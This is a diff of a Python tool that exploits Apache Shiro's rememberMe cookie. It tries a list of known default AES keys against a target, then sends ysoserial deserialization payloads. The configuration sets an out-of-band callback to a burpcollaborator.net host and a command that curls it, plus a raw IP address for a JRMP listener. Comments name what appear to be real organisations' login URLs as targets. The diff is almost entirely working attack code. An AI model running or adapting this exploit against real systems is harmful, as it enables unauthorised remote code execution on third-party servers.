@@ -12,9 +12,17 @@ import random
 from Crypto.Cipher import AES
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+
+red = "\x1B[31m"
+clear = "\x1b[0m"
+
 KEYS_SET = [
 "kPH+bIxk5D2deZiIxcaaaA==", #默认
 "4AvVhmFLUs0KTA3Kprsdag==", # jeecms
+"r0e3c16IdVkouZgk1TKVMg==", # jeesite
+"Z3VucwAAAAAAAAAAAAAAAA==",
 "0Av6jWaXCkCu5A9nJbPxLI==",
 "0AvVhmFLUs0KTA3Kprsdag==",
 "1AvVhdsgUs0FSA3SDFAdag==",
@@ -90,7 +98,6 @@ KEYS_SET = [
 "OUHYQzxQ/W9e/UjiAGu6rg==",
 "OY//C4rhfwNxCQAQCrQQ1Q==",
 "Q01TX0JGTFlLRVlfMjAxOQ==",
-"r0e3c16IdVkouZgk1TKVMg==",
 "rPNqM6uKFCyaL10AK51UkQ==",
 "RVZBTk5JR0hUTFlfV0FPVQ==",
 "s0KTA3mFLUprK4AvVhsdag==",
@@ -117,7 +124,6 @@ KEYS_SET = [
 "Ymx1ZXdoYWxlAAAAAAAAAA==",
 "yNeUgSzL/CfiWw1GALg6Ag==",
 # "Z3h6eWd4enklMjElMjElMjE=",
-"Z3VucwAAAAAAAAAAAAAAAA==",
 "ZAvph3dsQs0FSL3SDFAdag==",
 "ZmFsYWRvLnh5ei5zaGlybw==",
 "ZnJlc2h6Y24xMjM0NTY3OA==",
@@ -125,10 +131,10 @@ KEYS_SET = [
 
 JAVA_PATH = 'java'
 #YSOSERIAL_PATH = '/Users/cyan/HackerTools/command-tools/ysoserial-0.0.6-Plus.jar'
-YSOSERIAL_PATH = '/Users/cyan/Tools/ysoserial-0.0.8-SNAPSHOT-all.jar'
-DNS_LOG_HOST = 'http://im8kejmiehnhs5ziku6nwyp5bwhm5b.burpcollaborator.net'
-PAYLOAD = 'CommonsCollections10'
-COMMAND = "curl im8kejmiehnhs5ziku6nwyp5bwhm5b.burpcollaborator.net"
+YSOSERIAL_PATH = '/Users/cyan/Downloads/ysoserial-0.0.6-SNAPSHOT-all.jar'
+DNS_LOG_HOST = 'http://il780bvyc2uqmoxfvk2mepkdz45utj.burpcollaborator.net'
+PAYLOAD = 'JRMPClient'
+COMMAND = "8.210.56.187:80"
 # COMMAND = sys.argv[2]
 
 
@@ -194,7 +200,7 @@ def check_key(target):
             remember_str = encode_rememberme(serial_str,key)
             cookie = {"rememberMe": remember_str}
             if detect_shiro(target,cookie) == 0:
-                print(f"Checked\tKEY: {key}\t valid")
+                print(red + f"Checked\tKEY: {key}\t valid" + clear)
                 return key
             print(f"Checked\tKEY: {key}")
         else:
@@ -209,6 +215,7 @@ def check_key(target):
 if __name__ == '__main__':
     # tomcat + cc3.2.1 => cc10
     # cc4.0 => cc2
+    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36'}
 
     CC = ["CommonsBeanutils1","Jdk7u21","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7","CommonsCollections8","CommonsCollections9","CommonsCollections10"]
     if len(sys.argv) > 1:
@@ -223,9 +230,9 @@ if __name__ == '__main__':
             # for cc in CC:
             print("-"*80)
             print(f"{id}\tPAYLOAD: {PAYLOAD}\tCOMMAND: {COMMAND}")
-            # detect_shiro("https://tw.saicmotor.com/groupService/f",cookie = {"rememberMe": exp(key)})
+            # detect_shiro("http://fzmh.cib.com.cn/a/login",cookie = {"rememberMe": exp(key)})
             print("-"*80)
-            id+=1
+            # id+=1
             print(exp(key))
     else:
         print(f"shiro https://example.com/")
